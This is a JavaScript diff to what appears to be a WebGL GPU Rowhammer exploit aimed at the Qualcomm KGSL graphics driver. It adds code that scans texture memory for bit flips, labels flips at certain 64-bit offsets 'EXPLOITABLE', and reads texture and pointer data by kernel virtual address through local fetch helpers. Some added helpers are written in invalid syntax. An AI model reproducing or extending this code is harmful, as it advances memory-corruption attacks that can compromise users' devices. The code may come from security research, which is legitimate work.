@@ -100,17 +100,35 @@ function createRectangle() {
   gl.enableVertexAttribArray(0);
 }
 
-function checkForFlip(texture) {
+async function checkForFlip(texture) {
   // attach the texture as the first color attachment
   gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0);
-  if (gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
-    throw new Error('Framebuffer not complete! - ' + gl.checkFramebufferStatus(gl.FRAMEBUFFER));
+  while (gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
+    console.error('Framebuffer not complete! - ' + gl.checkFramebufferStatus(gl.FRAMEBUFFER));
+    await sleep(500);
   }
   
   var pixels = ARRAY_UINT8_READ_TEXTURE;
   gl.readPixels(0, 0, PAGE_TEXTURE_W, PAGE_TEXTURE_H, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
   for (let i = 0; i < KB4; i++) {
     if(pixels[i] != 0xFF) {
+      console.log(`++++ BIT FLIP IDENTIFIED`);
+      console.log(`+++ Value: ${pixels[i].toString(16)}, byte offset: ${i}, 64-bit offset: ${i % 8}`);
+      if ((i % 8) > 4) {
+        console.log('++++ BIT FLIP EXPLOITABLE');
+        return true;
+      }
+    }
+  }
+  return false;
+}
+
+async function doubleCheckForFlip(kgsl_tex) {
+  // attach the texture as the first color attachment
+
+  var pixels = await readTexture(kgsl_tex.v_addr);
+  for (let i = 0; i < KB4; i++) {
+    if (pixels[i] != 0xFF) {
       console.log(`++++ BIT FLIP IDENTIFIED`);
       console.log(`+++ Value: ${pixels[i].toString(16)}, byte offset: ${i}, 64-bit offset: ${i % 8}`);
       if ((i % 8) > 4) {
@@ -168,7 +186,7 @@ function fill_arrays(arr, len) {
 
 
 function allocatePages(pages) {
-  console.log(`++ Bulk allocating ${pages} pages | ${pages*KB4 / MB} MB of memory `)
+  console.log(`++ allocating ${pages} Javascript pages | ${pages*KB4 / MB} MB of memory `)
   for (let i = 0; i < pages; i++) {
     allocatePage()
   }
@@ -203,75 +221,18 @@ function xNumber(num, gap) {
   return gap ? `0x${ret.substr(0, 8)} ${ret.substr(8, 16)}` : `0x${ret}`
 }
 
-// IIFE to scope internal variables
-var float64ToInt64Binary = (function () {
-  // create union
-  var flt64 = new Float64Array(1)
-  var uint16 = new Uint16Array(flt64.buffer)
-  // 2**53-1
-  var MAX_SAFE = 9007199254740991
-  // 2**31
-  var MAX_INT32 = 2147483648
-  
-  function uint16ToBinary() {
-    var bin64 = ''
-    
-    // generate padded binary string a word at a time
-    for (var word = 0; word < 4; word++) {
-      bin64 = uint16[word].toString(2).padStart(16, 0) + bin64
-    }
-    
-    return bin64
-  }
-  
-  return function float64ToInt64Binary(number) {
-    // NaN would pass through Math.abs(number) > MAX_SAFE
-    // if (!(Math.abs(number) <= MAX_SAFE)) {
-    //   throw new RangeError('Absolute value must be less than 2**53')
-    // }
-    
-    var sign = number < 0 ? 1 : 0
-    
-    // shortcut using other answer for sufficiently small range
-    if (Math.abs(number) <= MAX_INT32) {
-      return (number >>> 0).toString(2).padStart(64, sign)
-    }
-    
-    // little endian byte ordering
-    flt64[0] = number
-    
-    // subtract bias from exponent bits
-    var exponent = ((uint16[3] & 0x7FF0) >> 4) - 1022
-    
-    // encode implicit leading bit of mantissa
-    uint16[3] |= 0x10
-    // clear exponent and sign bit
-    uint16[3] &= 0x1F
-    
-    // check sign bit
-    if (sign === 1) {
-      // apply two's complement
-      uint16[0] ^= 0xFFFF
-      uint16[1] ^= 0xFFFF
-      uint16[2] ^= 0xFFFF
-      uint16[3] ^= 0xFFFF
-      // propagate carry bit
-      for (var word = 0; word < 3 && uint16[word] === 0xFFFF; word++) {
-        // apply integer overflow
-        uint16[word] = 0
-      }
-      
-      // complete increment
-      uint16[word]++
-    }
-    
-    // only keep integer part of mantissa
-    var bin64 = uint16ToBinary().substr(11, Math.max(exponent, 0))
-    // sign-extend binary string
-    return bin64.padStart(64, sign)
-  }
-})()
+async readTexture(vaddr) {
+  return await fetch('read_texture?vaddr=' + vaddr).then(data => data.json())
+}
 
+async readPtr(vaddr) {
+  return await fetch('read_ptr?vaddr=' + vaddr).then(data => data.json())
+}
+
+/**
+ * DEPRECATED
+ * @param {Number} number 
+ */
 function to64bitFloat(number) {
   var f = new Float64Array(1);
   f[0] = number;
